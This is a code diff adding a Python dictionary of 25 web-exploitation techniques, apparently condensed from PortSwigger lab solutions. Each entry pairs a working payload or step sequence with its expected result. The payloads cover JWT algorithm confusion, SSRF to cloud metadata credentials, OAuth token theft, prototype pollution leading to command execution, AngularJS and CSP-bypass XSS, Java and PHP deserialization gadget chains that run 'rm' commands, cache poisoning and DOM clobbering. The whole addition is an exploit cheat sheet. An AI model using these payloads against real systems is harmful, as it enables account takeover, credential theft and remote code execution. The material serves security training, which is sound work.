@@ -518,6 +518,99 @@ T = {
    ("buy a gift card with a store-credit code, redeem it, repeat", "credit loop nets infinite money"),
 }
 
+# ---- the 25 exotic, verified from PortSwigger solutions (user-supplied 2026-06-25) ----
+T.update({
+ "jwt authentication bypass via algorithm confusion":
+   ("grab the RSA pubkey from /jwks.json; in JWT Editor import it, Copy Public Key as PEM, base64 it, "
+    "make an HMAC key with k=that; set alg:HS256 + sub:administrator and sign with it",
+    "server verifies HS256 using its RSA public key as the secret -> admin 200"),
+ "jwt authentication bypass via algorithm confusion with no exposed key":
+   ("no /jwks.json: run `docker run portswigger/sig2n <jwt1> <jwt2>` on two server tokens to recover the "
+    "RSA public key (X.509), then do the HS256-sign-with-pubkey trick",
+    "derived pubkey + HS256 sub:administrator accepted"),
+ "ssrf via openid dynamic client registration":
+   ('POST /reg (no auth) to register a client; set logo_uri to the internal target '
+    '("http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"); server fetches it on '
+    'GET /client/<client_id>/logo', "metadata/secret-key in the logo response"),
+ "stealing oauth access tokens via a proxy page":
+   ("redirect_uri path-traversal to an on-site page that postMessage's location.href to * "
+    "(e.g. .../oauth-callback/../post/comment/comment-form); host an iframe with that URL + a message "
+    "listener to exfil the token from the fragment", "victim's access token lands in your access log"),
+ "privilege escalation via server-side prototype pollution":
+   ('add {"__proto__":{"isAdmin":true}} to a JSON body the server deep-merges',
+    "your account silently gains the polluted admin property"),
+ "remote code execution via server-side prototype pollution":
+   ('pollute a child_process spawn option: {"__proto__":{"execArgv":["--eval=require(\'child_process\')'
+    '.execSync(\'rm ...\')"]}} so the next fork runs it', "command runs when the app forks a node child"),
+ "detecting server-side prototype pollution without polluted property reflection":
+   ('pollute a property with an observable SIDE EFFECT, e.g. {"__proto__":{"json spaces":10}} indents the '
+    "JSON response, or override status/content-type", "server behaviour changes = pollution confirmed"),
+ "bypassing flawed input filters for server-side prototype pollution":
+   ('if __proto__ is stripped, use the constructor chain: {"constructor":{"prototype":{"isAdmin":true}}}',
+    "same pollution via constructor.prototype"),
+ "exfiltrating sensitive data via server-side prototype pollution":
+   ("pollute an option that forces the server to emit data outbound (e.g. a shell/spawn arg or a config "
+    "URL), capture on Collaborator", "sensitive data hits your OOB endpoint"),
+ "dom xss via an alternative prototype pollution vector":
+   ("use the DOT vector when [bracket] is blocked: /?__proto__.sequence=alert(1) — gadget is manager."
+    "sequence passed to eval()", "alert fires via the eval sink"),
+ "client-side prototype pollution in third-party libraries":
+   ("use DOM Invader's prototype-pollution scan to find the source + gadget inside the bundled 3rd-party "
+    "lib, then chain to the sink", "Invader reports source->gadget->sink -> XSS"),
+ "reflected xss with angularjs sandbox escape without strings":
+   ("?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor."
+    "fromCharCode(120,61,97,108,101,114,116,40,49,41)=1", "overwrites charAt to break the sandbox -> alert"),
+ "reflected xss with angularjs sandbox escape and csp":
+   ('?search=<input id=x ng-focus=$event.composedPath()|orderBy:\'(z=alert)(document.cookie)\'>#x',
+    "ng-focus + orderBy reaches window scope, bypassing the sandbox + CSP"),
+ "reflected xss protected by very strict csp, with dangling markup attack":
+   ('CSP lacks form-action: inject <button formaction="//EXPLOIT" formmethod="get">Click</button> via the '
+    "email param to leak the CSRF token in the URL, then auto-submit change-email",
+    "CSRF token captured -> email changed"),
+ "reflected xss protected by csp, with csp bypass":
+   ("the report-uri has a controllable token param -> inject a directive: "
+    "?search=<script>alert(1)</script>&token=;script-src-elem %27unsafe-inline%27",
+    "your injected CSP directive re-enables inline script"),
+ "server-side template injection in a sandboxed environment":
+   ("escape the Java sandbox via reflection: ${product.getClass().getProtectionDomain().getCodeSource()."
+    "getLocation().toURI().resolve('/home/carlos/x').toURL().openStream().readAllBytes()}",
+    "file bytes returned despite the sandbox"),
+ "server-side template injection with a custom exploit":
+   ("abuse exposed object methods the error messages reveal: user.setAvatar('/etc/passwd','image/jpg') "
+    "then GET /avatar to read; user.gdprDelete() to delete", "arbitrary file read/delete via the template object"),
+ "developing a custom gadget chain for java deserialization":
+   ("leak source via /backup/*.java (.java~); ProductTemplate.readObject() puts id into SQL; serialize a "
+    "ProductTemplate with id=SQLi, base64, set as session cookie; error-based UNION extracts the password",
+    "SQL error reflects injected data -> CAST(password AS numeric) leaks it"),
+ "developing a custom gadget chain for php deserialization":
+   ("leak CustomTemplate.php~; __wakeup builds a Product from desc; DefaultMap.__get calls "
+    "call_user_func(callback,$name) -> set callback='exec', name='rm /home/carlos/morale.txt' in the "
+    "serialized object", "magic-method chain executes the shell command on unserialize"),
+ "using phar deserialization to deploy a custom gadget chain":
+   ("upload a PHAR-JPG polyglot avatar whose serialized objects carry a Twig SSTI RCE (Blog->desc), then "
+    "GET avatar.php?avatar=phar://wiener to deserialize", "phar:// stream triggers the gadget -> RCE"),
+ "cache key injection":
+   ("find unkeyed params (Pragma: x-get-cache-key); craft a URL where an unkeyed param carries a CRLF "
+    "Origin-header injection so the cached JS import is poisoned",
+    "/login cache entry serves a malicious localize.js -> alert(1)"),
+ "internal cache poisoning":
+   ("X-Forwarded-Host is unkeyed by the INTERNAL cache (but keyed by the external one); poison the "
+    "separately-cached geolocate.js fragment to point at your exploit server hosting alert(document.cookie)",
+    "internal fragment cached with your host -> XSS for every visitor"),
+ "exploiting dom clobbering to enable xss":
+   ('two anchors: <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//"> '
+    "— clobbers defaultAvatar.avatar (DOMPurify allows cid: which keeps the quote)",
+    "clobbered global var smuggles onerror -> alert on next load"),
+ "clobbering dom attributes to bypass html filters":
+   ("<form id=x tabindex=0 onfocus=print()><input id=attributes> — clobbering the filter's 'attributes' "
+    "property makes its length undefined so onfocus survives; trigger via #x focus",
+    "filtered handler executes (print/alert)"),
+ "host validation bypass via connection state attack":
+   ("send two requests down ONE keep-alive connection (Burp 'send group in sequence, single connection'): "
+    "1st with the valid Host (passes validation), 2nd with Host:192.168.0.1 to reach /admin",
+    "server validates only the first request on the connection -> 2nd hits admin"),
+})
+
 
 def main():
     pb._save({"version": 1, "techniques": []})        # fresh build
